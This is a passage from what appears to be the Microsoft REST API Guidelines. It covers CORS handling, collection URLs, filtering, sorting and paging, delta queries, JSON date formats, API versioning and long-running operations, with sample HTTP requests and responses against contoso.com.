\"code\": \"NullValue\", \"target\": \"PhoneNumber\", \"message\": \"Phone number must not be null\" }, { \"code\": \"NullValue\", \"target\": \"LastName\", \"message\": \"Last name must not be null\" }, { \"code\": \"MalformedValue\", \"target\": \"Address\", \"message\": \"Address is not valid\" } ] } } In this example there were multiple problems with the request, with each individual error listed in \"details.\" 7.11 HTTP Status Codes Standard HTTP Status Codes SHOULD be used; see the HTTP Status Code definitions for more information. 7.12 Client library optional Developers MUST be able to develop on a wide variety of platforms and languages, such as Windows, MacOS, Linux, C#, Python, Node.js, and Ruby. Services SHOULD be able to be accessed from simple HTTP tools such as curl without significant effort. Service developer portals SHOULD provide the equivalent of \"Get Developer Token\" to facilitate experimentation and curl support. 8 CORS Services compliant with the Microsoft REST API Guidelines MUST support CORS (Cross Origin Resource Sharing). Services SHOULD support an allowed origin of CORS * and enforce authorization through valid OAuth tokens. Services SHOULD NOT support user credentials with origin validation. There MAY be exceptions for special cases. 8.1 Client guidance Web developers usually don't need to do anything special to take advantage of CORS. All of the handshake steps happen invisibly as part of the standard XMLHttpRequest calls they make. Many other platforms, such as .NET, have integrated support for CORS. 8.1.1 Avoiding preflight Because the CORS protocol can trigger preflight requests that add additional round trips to the server, performance-critical apps might be interested in avoiding them. The spirit behind CORS is to avoid preflight for any simple cross-domain requests that old non-CORS-capable browsers were able to make. All other requests require preflight. A request is \"simple\" and avoids preflight if its method is GET, HEAD or POST, and if it doesn't contain any request headers besides Accept, Accept-Language and Content-Language. For POST requests, the Content-Type header is also allowed, but only if its value is \"application/x-www-form-urlencoded,\" \"multipart/form-data\" or \"text/plain.\" For any other headers or values, a preflight request will happen. 8.2 Service guidance At minimum, services MUST: Understand the Origin request header that browsers send on cross-domain requests, and the Access-Control-Request-Method request header that they send on preflight OPTIONS requests that check for access. If the Origin header is present in a request: If the request uses the OPTIONS method and contains the Access-Control-Request-Method header, then it is a preflight request intended to probe for access before the actual request. Otherwise, it is an actual request. For preflight requests, beyond performing the steps below to add headers, services MUST perform no additional processing and MUST return a 200 OK. For non-preflight requests, the headers below are added in addition to the request's regular processing. Add an Access-Control-Allow-Origin header to the response, containing the same value as the Origin request header. Note that this requires services to dynamically generate the header value. Resources that do not require cookies or any other form of user credentials MAY respond with a wildcard asterisk (*) instead. Note that the wildcard is acceptable here only, and not for any of the other headers described below. If the caller requires access to a response header that is not in the set of simple response headers (Cache-Control, Content-Language, Content-Type, Expires, Last-Modified, Pragma), then add an Access-Control-Expose-Headers header containing the list of additional response header names the client should have access to. If the request requires cookies, then add an Access-Control-Allow-Credentials header set to \"true.\" If the request was a preflight request (see first bullet), then the service MUST: Add an Access-Control-Allow-Headers response header containing the list of request header names the client is permitted to use. This list need only contain headers that are not in the set of simple request headers (Accept, Accept-Language, Content-Language). If there are no restrictions on headers the service accepts, the service MAY simply return the same value as the Access-Control-Request-Headers header sent by the client. Add an Access-Control-Allow-Methods response header containing the list of HTTP methods the caller is permitted to use. Add an Access-Control-Max-Age pref response header containing the number of seconds for which this preflight response is valid (and hence can be avoided before subsequent actual requests). Note that while it is customary to use a large value like 2592000 (30 days), many browsers self-impose a much lower limit (e.g., five minutes). Because browser preflight response caches are notoriously weak, the additional round trip from a preflight response hurts performance. Services used by interactive Web clients where performance is critical SHOULD avoid patterns that cause a preflight request For GET and HEAD calls, avoid requiring request headers that are not part of the simple set above. Allow them to be provided as query parameters instead. The Authorization header is not part of the simple set, so the authentication token MUST be sent through the \"access_token\" query parameter instead, for resources requiring authentication. Note that passing authentication tokens in the URL is not recommended, because it can lead to the token getting recorded in server logs and exposed to anyone with access to those logs. Services that accept authentication tokens through the URL MUST take steps to mitigate the security risks, such as using short-lived authentication tokens, suppressing the auth token from getting logged, and controlling access to server logs. Avoid requiring cookies. XmlHttpRequest will only send cookies on cross-domain requests if the \"withCredentials\" attribute is set; this also causes a preflight request. Services that require cookie-based authentication MUST use a \"dynamic canary\" to secure all APIs that accept cookies. For POST calls, prefer simple Content-Types in the set of (\"application/x-www-form-urlencoded,\" \"multipart/form-data,\" \"text/plain\") where applicable. Any other Content-Type will induce a preflight request. Services MUST NOT contravene other API recommendations in the name of avoiding CORS preflight requests. In particular, in accordance with recommendations, most POST requests will actually require a preflight request due to the Content-Type. If eliminating preflight is critical, then a service MAY support alternative mechanisms for data transfer, but the RECOMMENDED approach MUST also be supported. In addition, when appropriate services MAY support the JSONP pattern for simple, GET-only cross-domain access. In JSONP, services take a parameter indicating the format ($format=json) and a parameter indicating a callback ($callback=someFunc), and return a text/javascript document containing the JSON response wrapped in a function call with the indicated name. More on JSONP at Wikipedia: JSONP. 9 Collections 9.1 Item keys Services MAY support durable identifiers for each item in the collection, and that identifier SHOULD be represented in JSON as \"id\". These durable identifiers are often used as item keys. Collections that support durable identifiers MAY support delta queries. 9.2 Serialization Collections are represented in JSON using standard array notation. 9.3 Collection URL patterns Collections are located directly under the service root when they are top level, or as a segment under another resource when scoped to that resource. For example: GET https://api.contoso.com/v1.0/people Whenever possible, services MUST support the \"/\" pattern. For example: GET https://{serviceRoot}/{collection}/{id} Where: {serviceRoot} the combination of host (site URL) + the root path to the service {collection} the name of the collection, unabbreviated, pluralized {id} the value of the unique id property. When using the \"/\" pattern this MUST be the raw string/number/guid value with no quoting but properly escaped to fit in a URL segment. 9.3.1 Nested collections and properties Collection items MAY contain other collections. For example, a user collection MAY contain user resources that have multiple addresses: GET https://api.contoso.com/v1.0/people/123/addresses { \"value\": [ { \"street\": \"1st Avenue\", \"city\": \"Seattle\" }, { \"street\": \"124th Ave NE\", \"city\": \"Redmond\" } ] } 9.4 Big collections As data grows, so do collections. Planning for pagination is important for all services. Therefore, when multiple pages are available, the serialization payload MUST contain the opaque URL for the next page as appropriate. Refer to the paging guidance for more details. Clients MUST be resilient to collection data being either paged or nonpaged for any given request. { \"value\":[ { \"id\": \"Item 1\",\"price\": 99.95,\"sizes\": null}, { }, { }, { \"id\": \"Item 99\",\"price\": 59.99,\"sizes\": null} ], \"@nextLink\": \"{opaqueUrl}\" } 9.5 Changing collections POST requests are not idempotent. This means that two POST requests sent to a collection resource with exactly the same payload MAY lead to multiple items being created in that collection. This is often the case for insert operations on items with a server-side generated id. For example, the following request: POST https://api.contoso.com/v1.0/people Would lead to a response indicating the location of the new collection item: 201 Created Location: https://api.contoso.com/v1.0/people/123 And once executed again, would likely lead to another resource: 201 Created Location: https://api.contoso.com/v1.0/people/124 While a PUT request would require the indication of the collection item with the corresponding key instead: PUT https://api.contoso.com/v1.0/people/123 9.6 Sorting collections The results of a collection query MAY be sorted based on property values. The property is determined by the value of the $orderBy query parameter. The value of the $orderBy parameter contains a comma-separated list of expressions used to sort the items. A special case of such an expression is a property path terminating on a primitive property. The expression MAY include the suffix \"asc\" for ascending or \"desc\" for descending, separated from the property name by one or more spaces. If \"asc\" or \"desc\" is not specified, the service MUST order by the specified property in ascending order. NULL values MUST sort as \"less than\" non-NULL values. Items MUST be sorted by the result values of the first expression, and then items with the same value for the first expression are sorted by the result value of the second expression, and so on. The sort order is the inherent order for the type of the property. For example: GET https://api.contoso.com/v1.0/people?$orderBy=name Will return all people sorted by name in ascending order. For example: GET https://api.contoso.com/v1.0/people?$orderBy=name desc Will return all people sorted by name in descending order. Sub-sorts can be specified by a comma-separated list of property names with OPTIONAL direction qualifier. For example: GET https://api.contoso.com/v1.0/people?$orderBy=name desc,hireDate Will return all people sorted by name in descending order and a secondary sort order of hireDate in ascending order. Sorting MUST compose with filtering such that: GET https://api.contoso.com/v1.0/people?$filter=name eq 'david'&$orderBy=hireDate Will return all people whose name is David sorted in ascending order by hireDate. 9.6.1 Interpreting a sorting expression Sorting parameters MUST be consistent across pages, as both client and server-side paging is fully compatible with sorting. If a service does not support sorting by a property named in a $orderBy expression, the service MUST respond with an error message as defined in the Responding to Unsupported Requests section. 9.7 Filtering The $filter querystring parameter allows clients to filter a collection of resources that are addressed by a request URL. The expression specified with $filter is evaluated for each resource in the collection, and only items where the expression evaluates to true are included in the response. Resources for which the expression evaluates to false or to null, or which reference properties that are unavailable due to permissions, are omitted from the response. Example: return all Products whose Price is less than $10.00 GET https://api.contoso.com/v1.0/products?$filter=price lt 10.00 The value of the $filter option is a Boolean expression. 9.7.1 Filter operations Services that support $filter SHOULD support the following minimal set of operations. Operator Description Example Comparison Operators eq Equal city eq 'Redmond' ne Not equal city ne 'London' gt Greater than price gt 20 ge Greater than or equal price ge 10 lt Less than price lt 20 le Less than or equal price le 100 Logical Operators and Logical and price le 200 and price gt 3.5 or Logical or price le 3.5 or price gt 200 not Logical negation not price le 3.5 Grouping Operators ( ) Precedence grouping (priority eq 1 or city eq 'Redmond') and price gt 100 9.7.2 Operator examples The following examples illustrate the use and semantics of each of the logical operators. Example: all products with a name equal to 'Milk' GET https://api.contoso.com/v1.0/products?$filter=name eq 'Milk' Example: all products with a name not equal to 'Milk' GET https://api.contoso.com/v1.0/products?$filter=name ne 'Milk' Example: all products with the name 'Milk' that also have a price less than 2.55: GET https://api.contoso.com/v1.0/products?$filter=name eq 'Milk' and price lt 2.55 Example: all products that either have the name 'Milk' or have a price less than 2.55: GET https://api.contoso.com/v1.0/products?$filter=name eq 'Milk' or price lt 2.55 Example 54: all products that have the name 'Milk' or 'Eggs' and have a price less than 2.55: GET https://api.contoso.com/v1.0/products?$filter=(name eq 'Milk' or name eq 'Eggs') and price lt 2.55 9.7.3 Operator precedence Services MUST use the following operator precedence for supported operators when evaluating $filter expressions. Operators are listed by category in order of precedence from highest to lowest. Operators in the same category have equal precedence: Group Operator Description Grouping ( ) Precedence grouping Unary not Logical Negation Relational gt Greater Than | ge | Greater than or Equal | lt | Less Than | le | Less than or Equal Equality | eq | Equal | ne | Not Equal Conditional AND | and | Logical And Conditional OR | or | Logical Or 9.8 Pagination RESTful APIs that return collections MAY return partial sets. Consumers of these services MUST expect partial result sets and correctly page through to retrieve an entire set. There are two forms of pagination that MAY be supported by RESTful APIs. Server-driven paging mitigates against denial-of-service attacks by forcibly paginating a request over multiple response payloads. Client-driven paging enables clients to request only the number of resources that it can use at a given time. Sorting and Filtering parameters MUST be consistent across pages, because both client- and server-side paging is fully compatible with both filtering and sorting. 9.8.1 Server-driven paging Paginated responses MUST indicate a partial result by including a continuation token in the response. The absence of a continuation token means that no additional pages are available. Clients MUST treat the continuation URL as opaque, which means that query options may not be changed while iterating over a set of partial results. Example: GET http://api.contoso.com/v1.0/people HTTP/1.1 Accept: application/json HTTP/1.1 200 OK Content-Type: application/json { ..., \"value\": [...], \"@nextLink\": \"{opaqueUrl}\" } 9.8.2 Client-driven paging Clients MAY use $top and $skip query parameters to specify a number of results to return and an offset. The server SHOULD honor the values specified by the client; however, clients MUST be prepared to handle responses that contain a different page size or contain a continuation token. Note: If the server can't honor $top and/or $skip, the server MUST return an error to the client informing about it instead of just ignoring the query options. This will avoid the risk of the client making assumptions about the data returned. Example: GET http://api.contoso.com/v1.0/people?$top=5&$skip=2 HTTP/1.1 Accept: application/json HTTP/1.1 200 OK Content-Type: application/json { ..., \"value\": [...] } 9.8.3 Additional considerations Stable order prerequisite: Both forms of paging depend on the collection of items having a stable order. The server MUST supplement any specified order criteria with additional sorts (typically by key) to ensure that items are always ordered consistently. Missing/repeated results: Even if the server enforces a consistent sort order, results MAY be missing or repeated based on creation or deletion of other resources. Clients MUST be prepared to deal with these discrepancies. The server SHOULD always encode the record ID of the last read record, helping the client in the process of managing repeated/missing results. Combining client- and server-driven paging: Note that client-driven paging does not preclude server-driven paging. If the page size requested by the client is larger than the default page size supported by the server, the expected response would be the number of results specified by the client, paginated as specified by the server paging settings. Page Size: Clients MAY request server-driven paging with a specific page size by specifying a $maxpagesize preference. The server SHOULD honor this preference if the specified page size is smaller than the server's default page size. Paginating embedded collections: It is possible for both client-driven paging and server-driven paging to be applied to embedded collections. If a server paginates an embedded collection, it MUST include additional continuation tokens as appropriate. Recordset count: Developers who want to know the full number of records across all pages, MAY include the query parameter $count=true to tell the server to include the count of items in the response. 9.9 Compound collection operations Filtering, Sorting and Pagination operations MAY all be performed against a given collection. When these operations are performed together, the evaluation order MUST be: Filtering. This includes all range expressions performed as an AND operation. Sorting. The potentially filtered list is sorted according to the sort criteria. Pagination. The materialized paginated view is presented over the filtered, sorted list. This applies to both server-driven pagination and client-driven pagination. 10 Delta queries Services MAY choose to support delta queries. 10.1 Delta links Delta links are opaque, service-generated links that the client uses to retrieve subsequent changes to a result. At a conceptual level delta links are based on a defining query that describes the set of results for which changes are being tracked. The delta link encodes the collection of entities for which changes are being tracked, along with a starting point from which to track changes. If the query contains a filter, the response MUST include only changes to entities matching the specified criteria. The key principles of the Delta Query are: Every item in the set MUST have a persistent identifier. That identifier SHOULD be represented as \"id\". This identifier is a service defined opaque string that MAY be used by the client to track object across calls. The delta MUST contain an entry for each entity that newly matches the specified criteria, and MUST contain a \"@removed\" entry for each entity that no longer matches the criteria. Re-evaluate the query and compare it to original set of results; every entry uniquely in the current set MUST be returned as an Add operation, and every entry uniquely in the original set MUST be returned as a \"remove\" operation. Each entity that previously did not match the criteria but matches it now MUST be returned as an \"add\"; conversely, each entity that previously matched the query but no longer does MUST be returned as a \"@removed\" entry. Entities that have changed MUST be included in the set using their standard representation. Services MAY add additional metadata to the \"@removed\" node, such as a reason for removal, or a \"removed at\" timestamp. We recommend teams coordinate with the Microsoft REST API Guidelines Working Group on extensions to help maintain consistency. The delta link MUST NOT encode any client top or skip value. 10.2 Entity representation Added and updated entities are represented in the entity set using their standard representation. From the perspective of the set, there is no difference between an added or updated entity. Removed entities are represented using only their \"id\" and an \"@removed\" node. The presence of an \"@removed\" node MUST represent the removal of the entry from the set. 10.3 Obtaining a delta link A delta link is obtained by querying a collection or entity and appending a $delta query string parameter. For example: GET https://api.contoso.com/v1.0/people?$delta HTTP/1.1 Accept: application/json HTTP/1.1 200 OK Content-Type: application/json { \"value\":[ { \"id\": \"1\", \"name\": \"Matt\"}, { \"id\": \"2\", \"name\": \"Mark\"}, { \"id\": \"3\", \"name\": \"John\"}, ], \"@deltaLink\": \"{opaqueUrl}\" } Note: If the collection is paginated the deltaLink will only be present on the final page but MUST reflect any changes to the data returned across all pages. 10.4 Contents of a delta link response Added/Updated entries MUST appear as regular JSON objects, with regular item properties. Returning the added/modified items in their regular representation allows the client to merge them into their existing \"cache\" using standard merge concepts based on the \"id\" field. Entries removed from the defined collection MUST be included in the response. Items removed from the set MUST be represented using only their \"id\" and an \"@removed\" node. 10.5 Using a delta link The client requests changes by invoking the GET method on the delta link. The client MUST use the delta URL as is -- in other words the client MUST NOT modify the URL in any way (e.g., parsing it and adding additional query string parameters). In this example: GET https://{opaqueUrl} HTTP/1.1 Accept: application/json HTTP/1.1 200 OK Content-Type: application/json { \"value\":[ { \"id\": \"1\", \"name\": \"Mat\"}, { \"id\": \"2\", \"name\": \"Marc\"}, { \"id\": \"3\", \"@removed\": {} }, { \"id\": \"4\", \"name\": \"Luc\"} ], \"@deltaLink\": \"{opaqueUrl}\" } The results of a request against the delta link may span multiple pages but MUST be ordered by the service across all pages in such a way as to ensure a deterministic result when applied in order to the response that contained the delta link. If no changes have occurred, the response is an empty collection that contains a delta link for subsequent changes if requested. This delta link MAY be identical to the delta link resulting in the empty collection of changes. If the delta link is no longer valid, the service MUST respond with 410 Gone. The response SHOULD include a Location header that the client can use to retrieve a new baseline set of results. 11 JSON standardizations 11.1 JSON formatting standardization for primitive types Primitive values MUST be serialized to JSON following the rules of RFC4627. 11.2 Guidelines for dates and times 11.2.1 Producing dates Services MUST produce dates using the DateLiteral format, and SHOULD use the Iso8601Literal format unless there are compelling reasons to do otherwise. Services that do use the StructuredDateLiteral format MUST NOT produce dates using the T kind unless BOTH the additional precision is REQUIRED and ECMAScript clients are explicitly unsupported. (Non-Normative statement: When deciding which particular DateKind to standardize on, the approximate order of preference is E, C, U, W, O, X, I, T. This optimizes for ECMAScript, .NET, and C++ programmers, in that order.) 11.2.2 Consuming dates Services MUST accept dates from clients that use the same DateLiteral format (including the DateKind, if applicable) that they produce, and SHOULD accept dates using any DateLiteral format. 11.2.3 Compatibility Services MUST use the same DateLiteral format (including the same DateKind, if applicable) for all resources of the same type, and SHOULD use the same DateLiteral format (and DateKind, if applicable) for all resources across the entire service. Any change to the DateLiteral format produced by the service (including the DateKind, if applicable) and any reductions in the DateLiteral formats (and DateKind, if applicable) accepted by the service MUST be treated as a breaking change. Any widening of the DateLiteral formats accepted by the service is NOT considered a breaking change. 11.3 JSON serialization of dates and times Round-tripping serialized dates with JSON is a hard problem. Although ECMAScript supports literals for most built-in types, it does not define a literal format for dates. The Web has coalesced around the ECMAScript subset of ISO 8601 date formats (ISO 8601), but there are situations where this format is not desirable. For those cases, this document defines a JSON serialization format that can be used to unambiguously represent dates in different formats. Other serialization formats (such as XML) could be derived from this format. 11.3.1 The DateLiteral format Dates represented in JSON are serialized using the following grammar. Informally, a DateValue is either an ISO 8601-formatted string or a JSON object containing two properties named kind and value that together define a point in time. The following is not a context-free grammar; in particular, the interpretation of DateValue depends on the value of DateKind, but this minimizes the number of productions required to describe the format. DateLiteral: Iso8601Literal StructuredDateLiteral Iso8601Literal: A string literal as defined in http://www.ecma-international.org/ecma-262/5.1/#sec-15.9.1.15. Note that the full grammar for ISO 8601 (such as \"basic format\" without separators) is not supported. All dates default to UTC unless specified otherwise. StructuredDateLiteral: { DateKindProperty , DateValueProperty } { DateValueProperty , DateKindProperty } DateKindProperty \"kind\" : DateKind DateKind: \"C\" ; see below \"E\" ; see below \"I\" ; see below \"O\" ; see below \"T\" ; see below \"U\" ; see below \"W\" ; see below \"X\" ; see below DateValueProperty: \"value\" : DateValue DateValue: UnsignedInteger ; not defined here SignedInteger ; not defined here RealNumber ; not defined here Iso8601Literal ; as above 11.3.2 Commentary on date formatting A DateLiteral using the Iso8601Literal production is relatively straightforward. Here is an example of an object with a property named creationDate that is set to February 13, 2015, at 1:15 p.m. UTC: { \"creationDate\" : \"2015-02-13T13:15Z\" } The StructuredDateLiteral consists of a DateKind and an accompanying DateValue whose valid values (and their interpretation) depend on the DateKind. The following table describes the valid combinations and their meaning: DateKind DateValue Colloquial Name & Interpretation More Info C UnsignedInteger \"CLR\"; number of milliseconds since midnight January 1, 0001; negative values are not allowed. See note below. MSDN E SignedInteger \"ECMAScript\"; number of milliseconds since midnight, January 1, 1970. ECMA International I Iso8601Literal \"ISO 8601\"; a string limited to the ECMAScript subset. O RealNumber \"OLE Date\"; integral part is the number of days since midnight, December 31, 1899, and fractional part is the time within the day (0.5 = midday). MSDN T SignedInteger \"Ticks\"; number of ticks (100-nanosecond intervals) since midnight January 1, 1601. See note below. MSDN U SignedInteger \"UNIX\"; number of seconds since midnight, January 1, 1970. MSDN W SignedInteger \"Windows\"; number of milliseconds since midnight January 1, 1601. See note below. MSDN X RealNumber \"Excel\"; as for O but the year 1900 is incorrectly treated as a leap year, and day 0 is \"January 0 (zero).\" Microsoft Support Important note for C and W kinds: The native CLR and Windows times are represented by 100-nanosecond \"tick\" values. To interoperate with ECMAScript clients that have limited precision, these values MUST be converted to and from milliseconds when (de)serialized as a DateLiteral. One millisecond is equivalent to 10,000 ticks. Important note for T kind: This kind preserves the full fidelity of the Windows native time formats (and is trivially convertible to and from the native CLR format) but is incompatible with ECMAScript clients. Therefore, its use SHOULD be limited to only those scenarios that both require the additional precision and do not need to interoperate with ECMAScript clients. Here is the same example of an object with a property named creationDate that is set to February 13, 2015, at 1:15 p.m. UTC, using several formats: [ { \"creationDate\" : { \"kind\" : \"O\", \"value\" : 42048.55 } }, { \"creationDate\" : { \"kind\" : \"E\", \"value\" : 1423862100000 } } ] One of the benefits of separating the kind from the value is that once a client knows the kind used by a particular service, it can interpret the value without requiring any additional parsing. In the common case of the value being a number, this makes coding easier for developers: // We know this service always gives out ECMAScript-format dates var date = new Date(serverResponse.someObject.creationDate.value); 11.4 Durations Durations need to be serialized in conformance with ISO 8601. Durations are \"represented by the format P[n]Y[n]M[n]DT[n]H[n]M[n]S.\" From the standard: P is the duration designator (historically called \"period\") placed at the start of the duration representation. Y is the year designator that follows the value for the number of years. M is the month designator that follows the value for the number of months. W is the week designator that follows the value for the number of weeks. D is the day designator that follows the value for the number of days. T is the time designator that precedes the time components of the representation. H is the hour designator that follows the value for the number of hours. M is the minute designator that follows the value for the number of minutes. S is the second designator that follows the value for the number of seconds. For example, \"P3Y6M4DT12H30M5S\" represents a duration of \"three years, six months, four days, twelve hours, thirty minutes, and five seconds.\" 11.5 Intervals Intervals are defined as part of ISO 8601. Start and end, such as \"2007-03-01T13:00:00Z/2008-05-11T15:30:00Z\" Start and duration, such as \"2007-03-01T13:00:00Z/P1Y2M10DT2H30M\" Duration and end, such as \"P1Y2M10DT2H30M/2008-05-11T15:30:00Z\" Duration only, such as \"P1Y2M10DT2H30M,\" with additional context information 11.6 Repeating intervals Repeating Intervals, as per ISO 8601, are: Formed by adding \"R[n]/\" to the beginning of an interval expression, where R is used as the letter itself and [n] is replaced by the number of repetitions. Leaving out the value for [n] means an unbounded number of repetitions. For example, to repeat the interval of \"P1Y2M10DT2H30M\" five times starting at \"2008-03-01T13:00:00Z,\" use \"R5/2008-03-01T13:00:00Z/P1Y2M10DT2H30M.\" 12 Versioning All APIs compliant with the Microsoft REST API Guidelines MUST support explicit versioning. It's critical that clients can count on services to be stable over time, and it's critical that services can add features and make changes. 12.1 Versioning formats Services are versioned using a Major.Minor versioning scheme. Services MAY opt for a \"Major\" only version scheme in which case the \".0\" is implied and all other rules in this section apply. Two options for specifying the version of a REST API request are supported: Embedded in the path of the request URL, at the end of the service root: https://api.contoso.com/v1.0/products/users As a query string parameter of the URL: https://api.contoso.com/products/users?api-version=1.0 Guidance for choosing between the two options is as follows: Services co-located behind a DNS endpoint MUST use the same versioning mechanism. In this scenario, a consistent user experience across the endpoint is paramount. The Microsoft REST API Guidelines Working Group recommends that new top-level DNS endpoints are not created without explicit conversations with your organization's leadership team. Services that guarantee the stability of their REST API's URL paths, even through future versions of the API, MAY adopt the query string parameter mechanism. This means the naming and structure of the relationships described in the API cannot evolve after the API ships, even across versions with breaking changes. Services that cannot ensure URL path stability across future versions MUST embed the version in the URL path. Certain bedrock services such as Microsoft's Azure Active Directory may be exposed behind multiple endpoints. Such services MUST support the versioning mechanisms of each endpoint, even if that means supporting multiple versioning mechanisms. 12.1.1 Group versioning Group versioning is an OPTIONAL feature that MAY be offered on services using the query string parameter mechanism. Group versions allow for logical grouping of API endpoints under a common versioning moniker. This allows developers to look up a single version number and use it across multiple endpoints. Group version numbers are well known, and services SHOULD reject any unrecognized values. Internally, services will take a Group Version and map it to the appropriate Major.Minor version. The Group Version format is defined as YYYY-MM-DD, for example 2012-12-07 for December 7, 2012. This Date versioning format applies only to Group Versions and SHOULD NOT be used as an alternative to Major.Minor versioning. 12.1.1.1 Examples of group versioning Group Major.Minor 2012-12-01 1.0 2013-03-21 | 1.0 | 2.0 | 3.0 | 3.1 | 3.2 | 3.3 Version Format Example Interpretation {groupVersion} 2013-03-21, 2012-12-01 3.3, 1.2 {majorVersion} 3 3.0 {majorVersion}.{minorVersion} 1.2 1.2 Clients can specify either the group version or the Major.Minor version: For example: GET http://api.contoso.com/acct1/c1/blob2?api-version=1.0 PUT http://api.contoso.com/acct1/c1/b2?api-version=2011-12-07 12.2 When to version Services MUST increment their version number in response to any breaking API change. See the following section for a detailed discussion of what constitutes a breaking change. Services MAY increment their version number for nonbreaking changes as well, if desired. Use a new major version number to signal that support for existing clients will be deprecated in the future. When introducing a new major version, services MUST provide a clear upgrade path for existing clients and develop a plan for deprecation that is consistent with their business group's policies. Services SHOULD use a new minor version number for all other changes. Online documentation of versioned services MUST indicate the current support status of each previous API version and provide a path to the latest version. 12.3 Definition of a breaking change Changes to the contract of an API are considered a breaking change. Changes that impact the backwards compatibility of an API are a breaking change. Teams MAY define backwards compatibility as their business needs require. For example, Azure defines the addition of a new JSON field in a response to be not backwards compatible. Office 365 has a looser definition of backwards compatibility and allows JSON fields to be added to responses. Clear examples of breaking changes: Removing or renaming APIs or API parameters Changes in behavior for an existing API Changes in Error Codes and Fault Contracts Anything that would violate the Principle of Least Astonishment Services MUST explicitly define their definition of a breaking change, especially with regard to adding new fields to JSON responses and adding new API arguments with default fields. Services that are co-located behind a DNS Endpoint with other services MUST be consistent in defining contract extensibility. The applicable changes described in this section of the OData V4 spec SHOULD be considered part of the minimum bar that all services MUST consider a breaking change. 13 Long running operations Long running operations, sometimes called async operations, tend to mean different things to different people. This section sets forth guidance around different types of long running operations, and describes the wire protocols and best practices for these types of operations. One or more clients MUST be able to monitor and operate on the same resource at the same time. The state of the system SHOULD be discoverable and testable at all times. Clients SHOULD be able to determine the system state even if the operation tracking resource is no longer active. The act of querying the state of a long running operation should itself leverage principles of the web. i.e. well defined resources with uniform interface semantics. Clients MAY issue a GET on some resource to determine the state of a long running operation Long running operations SHOULD work for clients looking to \"Fire and Forget\" and for clients looking to actively monitor and act upon results. Cancellation does not explicitly mean rollback. On a per-API defined case it may mean rollback, or compensation, or completion, or partial completion, etc. Following a cancelled operation, It SHOULD NOT be a client's responsibility to return the service to a consistent state which allows continued service. 13.1 Resource based long running operations (RELO) Resource based modeling is where the status of an operation is encoded in the resource and the wire protocol used is the standard synchronous protocol. In this model state transitions are well defined and goal states are similarly defined. This is the preferred model for long running operations and should be used wherever possible. Avoiding the complexity and mechanics of the LRO Wire Protocol makes things simpler for our users and tooling chain. An example may be a machine reboot, where the operation itself completes synchronously but the GET operation on the virtual machine resource would have a \"state: Rebooting\", \"state: Running\" that could be queried at any time. This model MAY integrate Push Notifications. While most operations are likely to be POST semantics, In addition to POST semantics services MAY support PUT semantics via routing to simplify their APIs. For example, a user that wants to create a database named \"db1\" could call: PUT https://api.contoso.com/v1.0/databases/db1 In this scenario the databases segment is processing the PUT operation. Services MAY also use the hybrid defined below. 13.2 Stepwise long running operations A stepwise operation is one that takes a long, and often unpredictable, length of time to complete, and doesn't offer state transition modeled in the resource. This section outlines the approach that services should use to expose such long running operations. Service MAY expose stepwise operations. Stepwise Long Running Operations are sometimes called \"Async\" operations. This causes confusion, as it mixes elements of platforms (\"Async / await\", \"promises\", \"futures\") with elements of API operation. This document uses the term \"Stepwise Long Running Operation\" or often just \"Stepwise Operation\" to avoid confusion over the word \"Async\". Services MUST perform as much synchronous validation as practical on stepwise requests. Services MUST prioritize returning errors in a synchronous way, with the goal of having only \"Valid\" operations processed using the long running operation wire protocol. For an API that's defined as a Stepwise Long Running Operation the service MUST go through the Stepwise Long Running Operation flow even if the operation can be completed immediately. In other words, APIs must adopt and stick with a LRO pattern and not change patterns based on circumstance. 13.2.1 PUT Services MAY enable PUT requests for entity creation. PUT https://api.contoso.com/v1.0/databases/db1 In this scenario the databases segment is processing the PUT operation. HTTP/1.1 202 Accepted Operation-Location: https://api.contoso.com/v1.0/operations/123 For services that need to return a 201 Created here, use the hybrid flow described below. The 202 Accepted should return no body. The 201 Created case should return the body of the target resource. 13.2.2 POST Services MAY enable POST requests for entity creation. POST https://api.contoso.com/v1.0/databases/ { \"fileName\": \"someFile.db\", \"color\": \"red\" } HTTP/1.1 202 Accepted Operation-Location: https://api.contoso.com/v1.0/operations/123 13.2.3 POST, hybrid model Services MAY respond synchronously to POST requests to collections that create a resource even if the resources aren't fully created when the response is generated. In order to use this pattern, the response MUST include a representation of the incomplete resource and an indication that it is incomplete. For example: POST https://api.contoso.com/v1.0/databases/ HTTP/1.1 Host: api.contoso.com Content-Type: application/json Accept: application/json { \"fileName\": \"someFile.db\", \"color\": \"red\" } Service response says the database has been created, but indicates the request is not completed by including the Operation-Location header. In this case the status property in the response payload also indicates the operation has not fully completed. HTTP/1.1 201 Created Location: https://api.contoso.com/v1.0/databases/db1 Operation-Location: https://api.contoso.com/v1.0/operations/123 { \"databaseName\": \"db1\", \"color\": \"red\", \"Status\": \"Provisioning\", [ other fields for \"database\" ] } 13.2.4 Operations resource Services MAY provide a \"/operations\" resource at the tenant level. Services that provide the \"/operations\" resource MUST provide GET semantics. GET MUST enumerate the set of operations, following standard pagination, sorting, and filtering semantics. The default sort order for this operation MUST be: Primary Sort Secondary Sort Not Started Operations Operation Creation Time Running Operations Operation Creation Time Completed Operations Operation Creation Time Note that \"Completed Operations\" is a goal state (see below), and may actually be any of several different states such as \"successful\", \"cancelled\", \"failed\" and so forth. 13.2.5 Operation resource An operation is a user addressable resource that tracks a stepwise long running operation. Operations MUST support GET semantics. The GET operation against an operation MUST return: The operation resource, it's state, and any extended state relevant to the particular API. 200 OK as the response code. Services MAY support operation cancellation by exposing DELETE on the operation. If supported DELETE operations MUST be idempotent. Note: From an API design perspective, cancellation does not explicitly mean rollback. On a per-API defined case it may mean rollback, or compensation, or completion, or partial completion, etc. Following a cancelled operation It SHOULD NOT be a client's responsibility to return the service to a consistent state which allows continued service. Services that do not support operation cancellation MUST return a 405 Method Not Allowed in the event of a DELETE. Operations MUST support the following states: NotStarted Running Succeeded. Terminal State. Failed. Terminal State. Services MAY add additional states, such as \"Cancelled\" or \"Partially Completed\". Services that support cancellation MUST sufficiently describe their cancellation such that the state of the system can be accurately determined and any compensating actions may be run. Services that support additional states should consider this list of canonical names and avoid creating new names if possible: Cancelling, Cancelled, Aborting, Aborted, Tombstone, Deleting, Deleted. An operation MUST contain, and provide in the GET response, the following information: The timestamp when the operation was created. A timestamp for when the current state was entered. The operation state (notstarted / running / completed). Services MAY add additional, API specific, fields into the operation. The operation status JSON returned looks like: { \"createdDateTime\": \"2015-06-19T12-01-03.45Z\", \"lastActionDateTime\": \"2015-06-19T12-01-03.45Z\", \"status\": \"notstarted | running | succeeded | failed\" } 13.2.5.1 Percent complete Sometimes it is impossible for services to know with any accuracy when an operation will complete. Which makes using 